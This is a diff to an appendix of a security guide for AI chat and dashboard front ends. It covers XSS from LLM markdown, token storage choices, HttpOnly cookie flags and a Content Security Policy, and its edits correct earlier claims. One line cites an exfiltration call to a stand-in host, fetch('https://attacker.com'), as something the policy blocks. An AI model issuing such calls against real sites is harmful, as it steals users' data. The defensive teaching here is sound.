@@ -3,7 +3,7 @@
 > **Part:** Appendices
 > **Market evidence:** TypeScript / JavaScript (10.7%); 681-posting aggregate; 131 securing-AI roles, 2026-08-25
 > **Reader status:** GAP (Addressing security vulnerabilities across dynamic web rendering and Node.js servers)
-> **Why this appendix exists:** The boom of generative AI has led to an explosion of client-side application interfaces. Frontend dashboards, chat interfaces (such as chatbot sidecars), and orchestration layers (like LangChain.js or custom Express-based gateways) are predominantly built using TypeScript or JavaScript. At a Staff+ level, you must secure these applications against client-side exploitation. This appendix covers client-side and full-stack security, focusing on preventing DOM-based Cross-Site Scripting (XSS) from non-deterministic LLM markdown outputs, securing client-side tokens, formulating robust Content Security Policies, and shielding Express/Vite servers from Prototype Pollution and subprocess injections.
+> **Why this appendix exists:** The boom of generative AI has led to an explosion of client-side application interfaces. Frontend dashboards, chat interfaces (such as chatbot sidecars), and orchestration layers (like LangChain.js or custom Express-based gateways) are predominantly built using TypeScript or JavaScript. At a Staff+ level, you must secure these applications against client-side exploitation. This appendix covers client-side and full-stack security, focusing on preventing DOM-based Cross-Site Scripting (XSS) from non-deterministic LLM markdown outputs, securing client-side tokens, formulating robust Content Security Policies, and shielding Express/Vite servers from Prototype Pollution and subprocess injection.
 
 ---
 
@@ -53,13 +53,13 @@ When managing user session states, JWT access tokens, or sensitive LLM API crede
 | :--- | :--- | :--- | :--- |
 | **`localStorage`** | **CRITICAL**. Any script executing in the page context can access `localStorage.getItem()` and steal tokens. | None (Requires explicit authorization header inclusion). | Non-sensitive UI layout preferences or offline state. |
 | **`sessionStorage`** | **HIGH**. Accessible via any script within the specific browser tab. Cleared on tab close. | None. | Temporary, non-sensitive session cache. |
-| **`HttpOnly` Cookie** | **ZERO**. The browser blocks JavaScript from reading the cookie via `document.cookie`. | **YES**. The browser automatically attaches cookies to outbound cross-site requests. | Sensitive session identifiers, refresh tokens, and authentication cookies. |
+| **`HttpOnly` Cookie** | Direct JavaScript token reads are blocked, but XSS can still issue authenticated same-origin requests and access responses available to the page. | **YES** unless mitigated by `SameSite`, anti-CSRF tokens and origin checks. | Sensitive session identifiers, refresh tokens, and authentication cookies. |
 
 ### 2.1 The HttpOnly Paved Path
 To protect session tokens, implement standard-session tokens inside `HttpOnly` cookies hardened with the following directives:
 -   `Secure`: Ensures the cookie is only transmitted over encrypted HTTPS connections.
 -   `SameSite=Strict` or `SameSite=Lax`: Restricts cookie transmission during cross-site requests, mitigating CSRF attacks.
--   `Path=/`: Restricts cookie visibility to designated API endpoints to limit exposure.
+-   `Path=/`: Sends the cookie throughout the origin's path tree; use a narrower path where appropriate. `Path` controls cookie transmission, not JavaScript visibility.
 
 ---
 
@@ -71,8 +71,8 @@ A Content Security Policy (CSP) is an HTTP response header that acts as a powerf
 ```http
 Content-Security-Policy: 
   default-src 'self'; 
-  script-src 'self' 'nonce-rAnd0m12345' 'strict-dynamic'; 
-  style-src 'self' 'unsafe-inline'; 
+  script-src 'self' 'nonce-{RANDOM_PER_RESPONSE_NONCE}' 'strict-dynamic'; 
+  style-src 'self' 'nonce-{RANDOM_PER_RESPONSE_NONCE}'; 
   connect-src 'self' https://api.openai.com https://api.anthropic.com; 
   img-src 'self' data: https://images.unsplash.com; 
   frame-ancestors 'none'; 
@@ -81,7 +81,7 @@ Content-Security-Policy:
   form-action 'self';
 ```
 
--   `script-src 'nonce-rAnd0m12345'`: Tells the browser to only execute scripts that possess a matching `nonce` attribute. Inline script injections will fail because the attacker cannot guess the cryptographic nonce generated per-request.
+-   `script-src 'nonce-{RANDOM_PER_RESPONSE_NONCE}'`: The server generates a fresh unpredictable nonce for every response and places the same value on explicitly trusted script elements. Do not reuse the example placeholder or a nonce across responses.
 -   `connect-src`: Explicitly locks down outbound API requests. Even if an attacker achieves XSS and tries to exfiltrate data via `fetch('https://attacker.com')`, the browser blocks the connection because `attacker.com` is not in the whitelist.
 -   `object-src 'none'`: Disables dangerous, legacy plugins like Flash or Silverlight.
 -   `frame-ancestors 'none'`: Prevents clickjacking by blocking other domains from embedding the application inside an `<iframe>`.
